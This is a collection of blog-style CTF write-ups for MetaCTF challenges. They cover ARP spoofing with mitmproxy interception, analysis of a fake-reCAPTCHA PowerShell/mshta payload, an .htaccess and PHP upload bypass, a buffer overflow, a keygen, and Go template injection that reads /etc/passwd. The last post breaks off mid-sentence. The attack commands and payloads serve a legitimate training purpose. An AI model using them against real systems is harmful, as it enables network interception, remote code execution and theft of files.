[{"content":"MetaCTF November 2024 Flash CTF consists of 5 challenges.\nSlithering Security Help me test my sssecurity, can you get the flag from this ssssecure sssscript? Download the challenge file here.\nWe are provided with a small Python script that prompts the user for a password. If the correct password is entered, the script reveals the flag.\nHere\u0026rsquo;s the code:\n#!/usr/bin/env python3 SECRET_FLAG=b\u0026#34;\\x54\\x57\\x56\\x30\\x59\\x55\\x4e\\x55\\x52\\x6e\\x74\\x6b\\x4d\\x47\\x34\\x33\\x58\\x7a\\x64\\x79\\x64\\x58\\x4d\\x33\\x58\\x32\\x4e\\x73\\x4d\\x57\\x34\\x33\\x63\\x31\\x39\\x33\\x61\\x54\\x64\\x6f\\x58\\x33\\x4d\\x7a\\x59\\x33\\x49\\x7a\\x4e\\x33\\x4e\\x7a\\x63\\x33\\x4e\\x7a\\x63\\x33\\x4e\\x39\u0026#34; HASHED_PASSWORD = b\u0026#39;\\x12\\x1eW\\x98\\x00\\xc1C\\xff\\xe3\\xa9\\x15\\xde\\xd9\\x00\\x9b\\xc9\u0026#39; from base64 import b64decode from hashlib import md5 def check_password(password): m = md5() m.update(password) return m.digest() == HASHED_PASSWORD def main(): while True: inp = input(\u0026#34;Please enter your passssssword: \u0026#34;).encode() if check_password(inp): print(f\u0026#34;Well done, your flag isssssss {b64decode(SECRET_FLAG).decode()}\u0026#34;) exit() else: print(\u0026#34;Passsssssword incorrect, please try again.\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: main() Both the password and the flag are represented in hexadecimal format, but the flag is further encoded in Base64.\nTo extract the flag, we can use CyberChef or the terminal. Using awk, we can strip out the \\x delimiters, convert the hexadecimal to ASCII, and then pipe the result into base64 for decoding.\necho -n \u0026#39;\\x54\\x57\\x56\\x30\\x59\\x55\\x4e\\x55\\x52\\x6e\\x74\\x6b\\x4d\\x47\\x34\\x33\\x58\\x7a\\x64\\x79\\x64\\x58\\x4d\\x33\\x58\\x32\\x4e\\x73\\x4d\\x57\\x34\\x33\\x63\\x31\\x39\\x33\\x61\\x54\\x64\\x6f\\x58\\x33\\x4d\\x7a\\x59\\x33\\x49\\x7a\\x4e\\x33\\x4e\\x7a\\x63\\x33\\x4e\\x7a\\x63\\x33\\x4e\\x39\u0026#39; | awk \u0026#39;{gsub(/\\\\x/, \u0026#34;\u0026#34;); print}\u0026#39; | base64 --decode Admin portal I\u0026rsquo;m writing a webpage for admins to check on their flags, can you do me a favor and check it out to make sure there aren\u0026rsquo;t any issues? Check out the website here.\nWe are given the URL to a webpage. Upon visiting, the following message is displayed:\nAccess denied. This page is only available by administrators. To gain access, we need to obtain administrator privileges.\nOpen the Developer tools by pressing F12. After inspecting the page, we find no traces of JavaScript. Switch to the Network tab to analyze the request and response headers. In the headers, we find the following cookie:\nCookie: role=user Exploiting the Cookie\nThe role cookie is set to user. We can modify it, and try to gain access:\nNavigate to the Application tab in the developer tools. Select Cookies from the left-side menu and locate the role cookie. Change its value from user to admin. Reload the page.\nAfter the cookie is changed and the page is reloaded, we are \u0026ldquo;authorized\u0026rdquo; and the flag is displayed.\nSteg64 You\u0026rsquo;ve heard of Base64, but I present to you Steg64! Download the challenge file here.\nVEh= QT== Tl== S5== IF== Wd== Tx== VY== IF== SA== Qd== Q1== Sx== RR== Up== Ie== Cs== Ct== Qh== VX== VN== IJ== T4== Vc== Ut== IN== Rt== TH== Qc== R8== IN== Se== Ux== IN== SR== Ts== II== Qd== Th== T3== VN== SI== RY== Us== IF== Q9== QQ== U9== VF== TP== RU== IQ== The description suggests that the challenge involves steganography- the practice of concealing information within other data in a way that isn\u0026rsquo;t obvious.\nEvery line is a string encoded in Base64. Letâ€™s break down Base64 principles.\nUnderstanding Base64\nIt takes 3 bytes (24 bits) of data at a time. It splits these bits into 4 groups of 6 bits each. Maps each 6-bit group to one of 64 printable characters: a-z, A-Z, 0-9, +, /. These 3 bytes are now turned into 4 printable ASCII characters. If the number of bytes is completely divisible by 3, leaving no remainder, then the mapping is perfect and no additional processing is needed.\nIn cases where it\u0026rsquo;s not, padding is needed to mark the unused bits.\n= is appended at the end for every unused 2 bits. E.g, QUI= (AB = 2 bytes of input) or QQ==(A = 1 byte of input).\nThe reference table for the conversion can be found here.\nThe decoders ignore those zero\u0026rsquo;d bits and the padding; thus, this gives the oppurtunity to hide information.\nHere\u0026rsquo;s a script that reads the steg64.txt file, processes and decodes every line, and extracts the hidden message.\nimport base64 def base64_to_6bit_values(line): # Converts a base64 encoded string to a string of 6-bit binary values. base64_chars = \u0026#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\u0026#34; char_to_6bit = {char: f\u0026#34;{index:06b}\u0026#34; for index, char in enumerate(base64_chars)} binary_string = \u0026#34;\u0026#34; for char in line.strip(): if char in char_to_6bit: binary_string += char_to_6bit[char] return binary_string def extract_unused_bits(line): # Extracts unused bits from the base64 encoded line. # Base64 encodes data in 6-bit chunks, and padding characters \u0026#39;=\u0026#39; are used to # mark unused bits. padding_count = line.count(\u0026#39;=\u0026#39;) if padding_count == 0: return \u0026#34;\u0026#34; # Calculate unused bits: 2 for one padding \u0026#39;=\u0026#39;, 4 for two \u0026#39;==\u0026#39; unused_bits = padding_count * 2 binary_string = base64_to_6bit_values(line) return binary_string[-unused_bits:] if unused_bits \u0026gt; 0 else \u0026#34;\u0026#34; def decode_steganography(file_path): # Reads the file, extracts unused bits, and converts them to readable text. unused_bits_accumulator = \u0026#34;\u0026#34; temp_msg = \u0026#34;\u0026#34; with open(file_path, \u0026#39;r\u0026#39;) as file: for line in file: b64_line = base64.b64decode(line) b64_line = b64_line.decode(\u0026#39;utf-8\u0026#39;) temp_msg += b64_line unused_bits_accumulator += extract_unused_bits(line) # This is the decoded main message. decoded_msg_set(temp_msg) # Break the binary string into chunks of 8 bits and convert to bytes incrementally byte_array = bytearray() for i in range(0, len(unused_bits_accumulator), 8): byte_chunk = unused_bits_accumulator[i:i + 8] if len(byte_chunk) == 8: # Ignore incomplete byte at the end byte_array.append(int(byte_chunk, 2)) # Convert bytes to readable text return byte_array.decode(\u0026#39;utf-8\u0026#39;, errors=\u0026#39;ignore\u0026#39;) # File path file_path = \u0026#34;steg64.txt\u0026#34; decoded_msg = [\u0026#34;\u0026#34;] def decoded_msg_set(s): decoded_msg[0] = s # Decode the steganographic content try: steganography = decode_steganography(file_path) print(\u0026#34;Decoded message:\u0026#34;) print(decoded_msg[0]) print(\u0026#34;\\n\u0026#34;) print(\u0026#34;Decoded steganography:\u0026#34;) print(steganography) except FileNotFoundError: print(f\u0026#34;The file \u0026#39;{file_path}\u0026#39; was not found.\u0026#34;) except Exception as e: print(f\u0026#34;An error occurred: {e}\u0026#34;) Talk to me We managed to tap the headphones of a member of a prolific cyber actor group. Can you listen to their secret plan? Download the wiretap here.\nWe have a PCAP file with USB packets inside.\nWe open the file in Wireshark and can see a little bit over 1000 USB packets. To extract the usb.data.iso field with its payload, we will need tshark (the command-line version of Wireshark).\nExtract the bytes, pipe to tr to delete every new line, and finally xxd to convert to binary.\ntshark -r talktome.pcap -T fields -e usb.iso.data \u0026#39;usb.src == \u0026#34;host\u0026#34;\u0026#39; | tr -d \u0026#39;\\n\u0026#39; \u0026gt; raw.txt | xxd -r -p \u0026gt; flag.raw -r talktome.pcap: Reads the PCAP file. -T fields -e usb.iso.data: Extracts only the usb.iso.data field. \u0026lsquo;usb.src == \u0026ldquo;host\u0026rdquo;\u0026rsquo;: Filters packets originating from the host. tr -d \u0026lsquo;\\n\u0026rsquo;: Removes newline characters to get a clean byte stream. xxd -r -p: Converts to binary format and writes it to flag.raw. Play the file via the terminal or import it to any software that supports raw data. (Make sure it\u0026rsquo;s set to 32-bit.)\nplay -r 44100 -b 32 -c 1 -e signed-integer flag.raw speed 0.7 -r 44100: Sample rate 44.1 kHz. -b 32: 32-bit audio depth. -c 1: Mono (1 channel). -e signed-integer: Interprets the audio data as signed integers. speed 0.7: Playback speed to 70% ","permalink":"https://hexed.space/posts/metactf-november-2024-flash-ctf/","summary":"MetaCTF November 2024 Flash CTF consists of 5 challenges.\nSlithering Security Help me test my sssecurity, can you get the flag from this ssssecure sssscript? Download the challenge file here.\nWe are provided with a small Python script that prompts the user for a password. If the correct password is entered, the script reveals the flag.\nHere\u0026rsquo;s the code:\n#!/usr/bin/env python3 SECRET_FLAG=b\u0026#34;\\x54\\x57\\x56\\x30\\x59\\x55\\x4e\\x55\\x52\\x6e\\x74\\x6b\\x4d\\x47\\x34\\x33\\x58\\x7a\\x64\\x79\\x64\\x58\\x4d\\x33\\x58\\x32\\x4e\\x73\\x4d\\x57\\x34\\x33\\x63\\x31\\x39\\x33\\x61\\x54\\x64\\x6f\\x58\\x33\\x4d\\x7a\\x59\\x33\\x49\\x7a\\x4e\\x33\\x4e\\x7a\\x63\\x33\\x4e\\x7a\\x63\\x33\\x4e\\x39\u0026#34; HASHED_PASSWORD = b\u0026#39;\\x12\\x1eW\\x98\\x00\\xc1C\\xff\\xe3\\xa9\\x15\\xde\\xd9\\x00\\x9b\\xc9\u0026#39; from base64 import b64decode from hashlib import md5 def check_password(password): m = md5() m.","title":"MetaCTF November 2024 Flash CTF"},{"content":" You managed to get access to a device (indicated in red) on the network shown below. One of the hosts on that network is sending the flag over HTTPS to another host every ~5 seconds. Can you intercept it? ?\nThis environment is somewhat limited. Look through the tools available to you on the machine. The network you connect to is not shared with other participants.\nConnect with ssh [REDACTED] -p 7000\nNote: When you connect to the remote host, you are given a Docker container. If you connect again, you will connect to a different container.\nTo capture the flag being sent between the hosts, we need to perform ARP spoofing, packet sniffing, and a MITM attack (proxying). Before we proceed, however, let\u0026rsquo;s go over the initial \u0026ldquo;reconnaissance\u0026rdquo; once we are inside the machine.\nObtain the IP and MAC addresses of the machine we are on. 192.168.0.201 and 02:42:0a:00:01:44\nroot@interceptor:/# ip addr 31631: eth0@if31632: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc noqueue state UP group default link/ether 02:42:0a:00:01:44 brd ff:ff:ff:ff:ff:ff link-netnsid 0 inet 192.168.0.201/24 scope global eth0 valid_lft forever preferred_lft forever Once we know this, we can scan the network with nmap to find out the other hosts.\nThe -sn flag tells nmap to perform quick host discovery using ICMP echo requests, without port scanning.\nroot@interceptor:/# nmap -sn 192.168.0.0/24 Starting Nmap 7.80 ( https://nmap.org ) at 2024-11-05 14:26 UTC Nmap scan report for 192.168.0.24 Host is up (0.000025s latency). MAC Address: 02:42:0A:00:01:42 (Unknown) Nmap scan report for 192.168.0.153 Host is up (0.000034s latency). MAC Address: 02:42:0A:00:01:43 (Unknown) Nmap scan report for 192.168.0.201 Host is up. Nmap done: 256 IP addresses (3 hosts up) scanned in 1.92 seconds Now we know the IP and MAC addresses of the two other hosts on the network that communicate with each other: 192.168.0.24 and 192.168.0.153.\nThe next step is to determine which host is the client sending the data (the flag) and which is acting as the server. This requires us to find the port with nmap or do packet sniffing with tcpdump after the ARP spoofing.\nThis writeup uses the packet sniffing method.\nWeâ€™ll perform ARP spoofing to intercept network traffic between the client and server.\nARP is a communication protocol that links IP and MAC addresses.\nARP spoofing is an attack that occurs on local networks where devices communicate using frames, which include the source and destination MAC addresses - that is OSI Layer 2.\nThe attack poisons the ARP caches by sending ARP messages to the hosts on the network, pretending to be someone else. Thus, all packets will be sent to the spoofed addresses.\nTo execute this attack, we need arpspoof to spoof the IP addresses of the two other hosts.\narpspoof -i eth0 -t 192.168.0.24 192.168.0.153 \u0026gt; /dev/null 2\u0026gt;\u0026amp;1 \u0026amp; arpspoof -i eth0 -t 192.168.0.153 192.168.0.24 \u0026gt; /dev/null 2\u0026gt;\u0026amp;1 \u0026amp; IP forwarding is required so the kernel can send the packets to the original destination. It\u0026rsquo;s already enabled though either of these commands can be used to enable it.\necho 1 | tee /proc/sys/net/ipv4/ip_forward or\nsysctl net.ipv4.ip_forward=1 Now it\u0026rsquo;s time to run tcpdump and find out which host is sending the data.\nroot@interceptor:/# tcpdump -i eth0 ... tcpdump: verbose output suppressed, use -v or -vv for full protocol decode listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes 15:17:04.519237 ARP, Reply 192.168.0.24 is-at 02:42:0a:00:01:44 (oui Unknown), length 28 15:17:05.039522 IP 192.168.0.24.59186 \u0026gt; 192.168.0.153.4443: Flags [S], seq 3433448447, win 64240, options [mss 1460,sackOK,TS val 471734931 ecr 0,nop,wscale 7], length 0 15:17:05.039584 IP 192.168.0.24.59186 \u0026gt; 192.168.0.153.4443: Flags [S], seq 3433448447, win 64240, options [mss 1460,sackOK,TS val 471734931 ecr 0,nop,wscale 7], length 0 15:17:05.039632 IP 192.168.0.153.4443 \u0026gt; 192.168.0.24.59186: Flags [S.], seq 2542239713, ack 3433448448, win 65160, options [mss 1460,sackOK,TS val 2297543373 ecr 471734931,nop,wscale 7], length 0 15:17:05.039651 IP 192.168.0.201 \u0026gt; 192.168.0.153: ICMP redirect 192.168.0.24 to host 192.168.0.24, length 68 15:17:05.039655 IP 192.168.0.153.4443 \u0026gt; 192.168.0.24.59186: Flags [S.], seq 2542239713, ack 3433448448, win 65160, options [mss 1460,sackOK,TS val 2297543373 ecr 471734931,nop,wscale 7], length 0 15:17:05.039695 IP 192.168.0.24.59186 \u0026gt; 192.168.0.153.4443: Flags [.], ack 1, win 502, options [nop,nop,TS val 471734932 ecr 2297543373], length 0 15:17:05.039701 IP 192.168.0.24.59186 \u0026gt; 192.168.0.153.4443: Flags [.], ack 1, win 502, options [nop,nop,TS val 471734932 ecr 2297543373], length 0 15:17:05.058794 IP 192.168.0.24.59186 \u0026gt; 192.168.0.153.4443: Flags [P.], seq 1:518, ack 1, win 502, options [nop,nop,TS val 471734951 ecr 2297543373], length 517 15:17:05.058833 IP 192.168.0.24.59186 \u0026gt; 192.168.0.153.4443: Flags [P.], seq 1:518, ack 1, win 502, options [nop,nop,TS val 471734951 ecr 2297543373], length 517 ... At timestamp 15:17:05.039522, 192.168.0.24 (client) initiates the 3-way handshake with 192.168.0.153 (server) on port 4443.\nIn the next step we will need a proxy - mitmproxy. This proxy will intercept the traffic and decrypt it, essentially doing Man-in-the-middle attack.\nThe default port for mitmproxy is 8080. We will redirect the packets coming to port 4443 to port 8080 (mitmproxy).\niptables -t nat -A PREROUTING -p tcp --dport 4443 -j REDIRECT --to-port 8080 Now run the mitmproxy\nNote: Without --ssl-insecure option mitmproxy, will produce an error \u0026ldquo;Cannot validate certificate hostname without SNI\u0026rdquo;\nmitmproxy --mode transparent --listen-port 8080 --ssl-insecure We can browse through the requests.\nInspect the decrypted content.\n","permalink":"https://hexed.space/posts/metactf-middleman/","summary":"You managed to get access to a device (indicated in red) on the network shown below. One of the hosts on that network is sending the flag over HTTPS to another host every ~5 seconds. Can you intercept it? ?\nThis environment is somewhat limited. Look through the tools available to you on the machine. The network you connect to is not shared with other participants.\nConnect with ssh [REDACTED] -p 7000","title":"MetaCTF Middleman"},{"content":"MetaCTF October 2024 Flash CTF consists of 5 challenges. Only 3 of them are covered here.\nrunCAPTCHA We\u0026rsquo;re tracking a cyber actor\u0026rsquo;s new malware campaign that\u0026rsquo;s using a fake reCAPTCHA check to infect computers. Thankfully, the malware itself seems to have been taken down, but \u0026gt;can you analyze the initial infection page to look for any signatures?\nWhen visiting the website, you are given \u0026ldquo;reCaptcha\u0026rdquo;, and upon clicking, a modal window appears, instructing you to verify that you are not a robot.\nThe verification process asks you to press: Win+R to bring up the Run command Ctrl+V to paste Enter to execute\nThe website uses Javascript to populate the clipboard with a malicious payload, and you are tricked into executing it.\npowershell.exe -eC bQBzAGgAdABhACAAaAB0AHQAcAA6AC8ALwBuAG8AbgBtAGEAbABpAGMAaQBvAHUAcwBjAGEAcAB0AGMAaABhAC4AbQBlAHQAYQBwAHIAbwBiAGwAZQBtAHMALgBjAG8AbQAvAE0AZQB0AGEAQwBUAEYAewBGADQAawAzAF8AYwA0AHAAVABjAGgAQABzAF8AcgB1AE4AXwBtADQAbAB3ADQAcgAzAH0A The payload is encoded in Base64, and the decoded payload executes malicious commands using PowerShell and mshta.\necho \u0026#34;bQBzAGgAdABhACAAaAB0AHQAcAA6AC8ALwBuAG8AbgBtAGEAbABpAGMAaQBvAHUAcwBjAGEAcAB0AGMAaABhAC4AbQBlAHQAYQBwAHIAbwBiAGwAZQBtAHMALgBjAG8AbQAvAE0AZQB0AGEAQwBUAEYAewBGADQAawAzAF8AYwA0AHAAVABjAGgAQABzAF8AcgB1AE4AXwBtADQAbAB3ADQAcgAzAH0A\u0026#34; | base64 --decode Payload is decoded and we can see the flag.\nThe -e parameter allows Powershell to execute scripts encoded in Base64.\nmshta is Microsoft HTML Application Host - a tool that can execute HTML Application (HTA) files.\nSpider\u0026rsquo;s Curse Exploring an ancient chamber, you come across a tomb, webs strung from end to end. You brush off the webs and open the tomb, to find yourself cursed! Utter the magic word to \u0026gt; free yourself!\nUsing the file command on the Linux system, we identify the file type as a Linux binary.\nLinux binary.\nWe run the binary, and based on the behavior, we realize it expects a certain input to lift the curse and give the flag.\nWe can also run strings to extract the strings.\nâ””â”€$ strings tomb /lib64/ld-linux-x86-64.so.2 puts __stack_chk_fail __libc_start_main __cxa_finalize sprintf __isoc99_scanf strcmp libc.so.6 GLIBC_2.7 GLIBC_2.4 GLIBC_2.2.5 GLIBC_2.34 _ITM_deregisterTMCloneTable __gmon_start__ _ITM_registerTMCloneTable PTE1 u3UH %02x 4d6574614354467b68337833645f3572316e67735f3472655f6e305f6d347463685f6630725f6d337d As you step into the ancient, cobweb-laden chamber, a chill runs down your spine. .... Not scrolling down too much, right after the strings for glibc, we can see an odd hex string.\nWe can decode it into readable text:\necho \u0026#34;4d6574614354467b68337833645f3572316e67735f3472655f6e305f6d347463685f6630725f6d337d\u0026#34; | xxd -r -p This results in the flag. We obtained it through a shortcut, but it can be done by loading it into Ghidra or IDA for analysis and revealing the internal logic.\nA quick decompile and pseudocode.\nWe can see the whole text that is printed when binary is run. At line, 21 we can see scanf loads the input to v4, then at line 22, v4 is converted to hex and loaded to s1. At line 23 strcmp compares to 4d6574614354467b68337833645f3572316e67735f3472655f6e305f6d3474636 which already extracted from the strings and decoded earlier.\nOpen Application We\u0026rsquo;re looking for enthusiastic applicants - who actively want our flag.\nA simple page with an upload form. It doesn\u0026rsquo;t specify the accepted formats.\nFirst we upload a simple image file to see what the page will do.\nAfter the initial test upload, we get the message\nFirst, we try uploading an image file (e.g., main.png). It is stored in the uploads directory, and trying to access it directly results in a 403 error (Forbidden).\nThe file main.png has been uploaded. File path: uploads/main.png PHP files with .PHP extension?\n\u0026lt;?php $result = shell_exec(\u0026#34;ls\u0026#34;); echo \u0026#34;$result\u0026#34;; ?\u0026gt; Not allowed.\nSorry, PHP files and its variations are not allowed.Sorry, your file was not uploaded. A PNG file with PHP code injected inside? Simplest technique is to add a metadata comment.\nThis can be done with exiftool or with hex editor, such as HxD\nexiftool -comment=\u0026#34;\u0026lt;?php phpinfo(); ?\u0026gt;\u0026#34; image.png The PHP code is added after the PNG magic bytes.\nThis works, the file uploads but the code can\u0026rsquo;t be executed.\nLegitimate image file with PHP extension also cannot be uploaded.\nText files can be uploaded.\nThe page only looks at the file extension and does not check MIME Type(Magic bytes) or Content Type.\nWe can try .htaccess file. It can make the server treat PNG files as PHP, and execute them.\nSetHandler application/x-httpd-php or\nAddType application/x-httpd-php .png The file .htaccess has been uploaded. File path: uploads/.htaccess With PHP files now executable, we can run commands such as ls to view the contents of the uploads directory, or ls ../ to explore the root directory.\n\u0026lt;?php $f = file_get_contents(\u0026#39;../flag.txt\u0026#39;); echo $f; ?\u0026gt; ","permalink":"https://hexed.space/posts/metactf-october-2024-flash-ctf/","summary":"MetaCTF October 2024 Flash CTF consists of 5 challenges. Only 3 of them are covered here.\nrunCAPTCHA We\u0026rsquo;re tracking a cyber actor\u0026rsquo;s new malware campaign that\u0026rsquo;s using a fake reCAPTCHA check to infect computers. Thankfully, the malware itself seems to have been taken down, but \u0026gt;can you analyze the initial infection page to look for any signatures?\nWhen visiting the website, you are given \u0026ldquo;reCaptcha\u0026rdquo;, and upon clicking, a modal window appears, instructing you to verify that you are not a robot.","title":"MetaCTF October 2024 Flash CTF"},{"content":"MetaCTF September 2024 Flash CTF consists of 5 challenges. Only 3 of them are covered here.\nStack Smashers This is the first challenge.\nWe are given the source code for a small C program that takes user input, writes it to a 16-byte buffer (buffer[16]), and then checks if memory.winner is set to true. If it is, the win() function is executed, which prints out the flag.\nThe program uses gets() to read the input. Since gets() is unsafe (it doesnâ€™t perform bounds checking), and there is no input validation, an overflow is possible.\nTo exploit this, we need an input of 17 or more bytes to overflow into the memory of memory.winner. By writing anything to this location, the condition check returns true, and the flag is printed.\nvoid win() { printf(\u0026#34;Congratulations! You\u0026#39;ve successfully performed a buffer overflow! Here\u0026#39;s your flag: FLAG_REDACTED_IN_SNIPPET\u0026#34;); //The flag has been removed from this version of the code, in the real running code, it will be printed when this function is called } int main() { struct { char buffer[16]; bool winner; } memory; memory.winner = false; gets(memory.buffer); if (memory.winner) { win(); } else { printf(\u0026#34;Try again!\\n\u0026#34;); } } Key For Me The second challenge.\nWe\u0026rsquo;re thinking of creating an serial key activation system to distribute our CTFs, can you do a quick check to make sure we\u0026rsquo;re the only ones able to make keys for it? I\u0026rsquo;m just a little paranoid recently. Here\u0026rsquo;s the source code, if you do make a key, enter it at nc [REDACTED] 30008 to claim a flag!\n#!/usr/local/bin/python from flag import FLAG def check_key(key): if len(key) != 8 or ord(key[0]) % 5 != 3 or ord(key[1]) % 4 != 2 or not key[2].isdigit() or not key[3].islower() or not ord(key[4]) \u0026lt;= ord(key[3]) + 5 or not key[5].isdigit() or int(key[5]) \u0026lt;= int(key[2]) + 2 or not key[6].islower() or ord(key[6]) \u0026gt;= ord(key[3]) - 3 or not key[7].isupper() or ord(key[7]) \u0026gt;= ord(key[4]) - 4: return False return True def main(): print(\u0026#34;\u0026#34;\u0026#34; MetaCTF Key Validation System _____ / _ \\\\__.--._._--.-_ | |_| ______________\\\\ \\\\_____/ \u0026#34;\u0026#34;\u0026#34;) key = input(\u0026#34;Enter your activation key: \u0026#34;) if check_key(key): print(f\u0026#34;Congratulations! You unlocked the door, here\u0026#39;s your prize: {FLAG}\u0026#34;) return 0 else: print(\u0026#34;Sadly your key didn\u0026#39;t work this time, keep working on it!\u0026#34;) return 1 if __name__ == \u0026#34;__main__\u0026#34;: main() In this challenge, we need to generate a key to get the flag. The function of interest here is check_key(), which has a single conditional statement with multiple logical conditions. We can break it down to make it easier to understand:\n# Length must be 8 if len(key) != 8: return False # First character - ASCII value must be modulo 5 equals 3. Eg. 8, 15, 28, 33... if ord(key[0]) % 5 != 3: return False # Second character - ASCII value must be modulo 4 equals 2. Eg. 10, 24, 26 if ord(key[1]) % 4 != 2: return False # Third character - Must be a digit if not key[2].isdigit(): return False # Fourth character - Must be in lower case. Eg a-z if not key[3].islower(): return False # Fifth character - ASCII value must be less or equal to the ASCII value of fourth character + 5 if not ord(key[4]) \u0026lt;= ord(key[3]) + 5: return False # Sixth character - Must be a digit and its value must be greater than the value of third character + 2 if not key[5].isdigit() or int(key[5]) \u0026lt;= int(key[2]) + 2: return False # Seventh character - Must be in lower case and its ASCII value must be less the value of fourth character - 3 if not key[6].islower() or ord(key[6]) \u0026gt;= ord(key[3]) - 3: return False # Eighth character - Must be in upper case and its ASCII value must be less than the ASCII value of the fifth character - 4 if not key[7].isupper() or ord(key[7]) \u0026gt;= ord(key[4]) - 4: return False return True We can either write a key generator or try to solve it manually.\nimport random import string def check_key(key): if len(key) != 8 or ord(key[0]) % 5 != 3 or ord(key[1]) % 4 != 2 or not key[2].isdigit() or not key[3].islower() or not ord(key[4]) \u0026lt;= ord(key[3]) + 5 or not key[5].isdigit() or int(key[5]) \u0026lt;= int(key[2]) + 2 or not key[6].islower() or ord(key[6]) \u0026gt;= ord(key[3]) - 3 or not key[7].isupper() or ord(key[7]) \u0026gt;= ord(key[4]) - 4: return False return True def gen_key(): key = [0] * 8 key[0] = chr(random.choice([x for x in range(33, 127) if x % 5 == 3])) key[1] = chr(random.choice([x for x in range(33, 127) if x % 4 == 2])) # Makes sure key[2] and key[5] work together. # key[5] is dependant and it needs to be greater than key[2]+2. This means the maximum value of key[2] can be 6. When key[2]+2=6+2=8, key[5] can only be 9 key[2] = random.choice([x for x in range(0, 7)]) # Makes sure key[3] and key[6] work together. # Must be at least 101(e) key[3] = random.choice(string.ascii_lowercase[5:]) # Makes sure key[4] and key[7] work together. # 69(E). Must be at least 70(F) while True: key[4] = chr(random.choice([x for x in range(33, 127) if x \u0026lt;= ord(key[3])+5 ])) if ord(key[4]) \u0026gt; 69: break # Generates a number between (key[2]+2)+1 and 9. +1 ensures the range begins from greater number. key[5] = random.choice([x for x in range((key[2]+2)+1, 10) ]) key[6] = random.choice([x for x in string.ascii_lowercase if ord(x) \u0026lt; ord(key[3]) - 3 ]) key[7] = random.choice([x for x in string.ascii_uppercase if ord(x) \u0026lt; ord(key[4]) - 4 ]) my_key = \u0026#34;\u0026#34;.join(map(str, key)) return my_key while True: my_key = gen_key() valid = check_key(my_key) if valid == True: print(my_key) break Run the script to generate a key. Connect to the server. Library I\u0026rsquo;ve been developing this little book library app in Go, but I think something is wrong with the way it\u0026rsquo;s handling book requests. Some of the book titles seem to be giving unexpected results\u0026hellip; Maybe you can figure it out?\npackage main import ( \u0026#34;html/template\u0026#34; \u0026#34;log\u0026#34; \u0026#34;net/http\u0026#34; \u0026#34;os\u0026#34; ) type ReadBook struct{} func (rb ReadBook) ReadBook(filePath string) string { content, err := os.ReadFile(filePath) if err != nil { return \u0026#34;Error reading file: \u0026#34; + err.Error() } return string(content) } var books = map[string]string{ \u0026#34;1984\u0026#34;: \u0026#34;1984 is a dystopian social science fiction novel by George Orwell.\u0026#34;, \u0026#34;brave_new_world\u0026#34;: \u0026#34;Brave New World is a dystopian novel by Aldous Huxley.\u0026#34;, \u0026#34;f451\u0026#34;: \u0026#34;Fahrenheit 451 is a dystopian novel by Ray Bradbury.\u0026#34;, } type Book struct { Title string Param string } func homeHandler(w http.ResponseWriter, r *http.Request) { var bookList []Book for key := range books { bookList = append(bookList, Book{ Title: key, Param: key, }) } tmpl := template.Must(template.ParseFiles(\u0026#34;templates/home.html\u0026#34;)) tmpl.Execute(w, bookList) } func bookHandler(w http.ResponseWriter, r *http.Request) { userBook := r.URL.Query().Get(\u0026#34;book\u0026#34;) bookContent, validBook := books[userBook] if validBook { tmpl := template.Must(template.ParseFiles(\u0026#34;templates/book.html\u0026#34;)) tmpl.Execute(w, bookContent) return } if userBook != \u0026#34;\u0026#34; { tmpl, err := template.New(\u0026#34;book\u0026#34;).Parse(userBook) if err != nil { http.Error(w, \u0026#34;Template parsing error: \u0026#34;+err.Error(), http.StatusInternalServerError) return } tmpl.Execute(w, ReadBook{}) return } http.Error(w, \u0026#34;No book specified\u0026#34;, http.StatusBadRequest) } func main() { port := os.Getenv(\u0026#34;PORT\u0026#34;) if port == \u0026#34;\u0026#34; { port = \u0026#34;8080\u0026#34; // Default to 8080 if no PORT environment variable is set } http.Handle(\u0026#34;/static/\u0026#34;, http.StripPrefix(\u0026#34;/static/\u0026#34;, http.FileServer(http.Dir(\u0026#34;static\u0026#34;)))) http.HandleFunc(\u0026#34;/\u0026#34;, homeHandler) http.HandleFunc(\u0026#34;/books\u0026#34;, bookHandler) log.Println(\u0026#34;Starting server on port \u0026#34; + port) log.Fatal(http.ListenAndServe(\u0026#34;:\u0026#34;+port, nil)) } A simple web page built with Go and its template system.\nThe homepage lists all book titles in the library, each linking to a book page with a description. It uses a GET parameter, \u0026ldquo;book,\u0026rdquo; to pass the title and handle the request.\nThe file containing the logic is main.go, and two html files inside directory \u0026ldquo;templates\u0026rdquo;\nThe function of interest here is bookHandler, which processes the book requests.\nThis is what happens: Here\u0026rsquo;s the process:\nuserBook is assigned the GET parameter \u0026ldquo;book\u0026rdquo;. bookContent, validBook access and retrieve the content from the books map. If validBook is true, the book\u0026rsquo;s description is displayed in the book.html template. Nothing out of the ordinary. If validBook is false, it checks whether userBook is non-empty, creates a new template named book , and parses userBook, which can contain Go template syntax. Finally, it executes the template with an empty instance of ReadBook{}.\nNo input validation or sanitization. This allows template injetion.\nIn the beginning of the code, you can see the defined empty struct and then the defined function/method ReadBook() for the above-mentioned empty struct. The function has a parameter filePath, and the file at that location is opened, read, and the content returned.\nReferring to Go\u0026rsquo;s html/template documentation, in order to do the injection we need to use the template syntax - {{ }} and . to access the template\u0026rsquo;s passed argument - ReadBook{} which can read a file.\nLets try books?book={{.ReadBook \u0026ldquo;/etc/passwd\u0026rdquo;}}\nroot:x:0:0:root:/root:/bin/sh bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin .... Or XSS injection.\n\u0026lt;script\u0026gt;alert(\u0026#39;Injection!\u0026#39;)\u0026lt;/script\u0026gt; It works. Now the flag.\nbooks?book={{.ReadBook \u0026ldquo;flag.txt\u0026rdquo;}}\n","permalink":"https://hexed.space/posts/metactf-september-2024-flash-ctf/","summary":"MetaCTF September 2024 Flash CTF consists of 5 challenges. Only 3 of them are covered here.\nStack Smashers This is the first challenge.\nWe are given the source code for a small C program that takes user input, writes it to a 16-byte buffer (buffer[16]), and then checks if memory.winner is set to true. If it is, the win() function is executed, which prints out the flag.\nThe program uses gets() to read the input.","title":"MetaCTF September 2024 Flash CTF"},{"content":"In this challenge, we are provided with an executable, as well as an address and a port to connect to via netcat.\nAfter connecting, we are asked to enter a name. With a little manual \u0026ldquo;fuzzing,\u0026rdquo; we discover that the application crashes with a \u0026ldquo;Segmentation fault\u0026rdquo; error when the input exceeds 25 